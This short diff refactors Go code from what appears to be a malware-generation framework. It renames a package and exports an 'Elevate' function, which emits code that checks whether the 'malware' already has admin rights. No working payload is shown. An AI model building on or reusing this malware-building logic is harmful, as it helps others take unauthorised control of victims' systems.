@@ -1,4 +1,4 @@
-package system
+package systemcommands
 
 import (
 	"fmt"
@@ -7,7 +7,7 @@ import (
 )
 
 // Tries to do a so-called "regular" elevation of the malwares priviliges
-func elevate(value string, s_json string) ([]string, string) {
+func Elevate(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "elevate"
 	body := []string{fmt.Sprintf("func %s(){", function_call), "if spine.is_admin{", "spine.log(\"Malware is already elevated\")", "return", "}"}
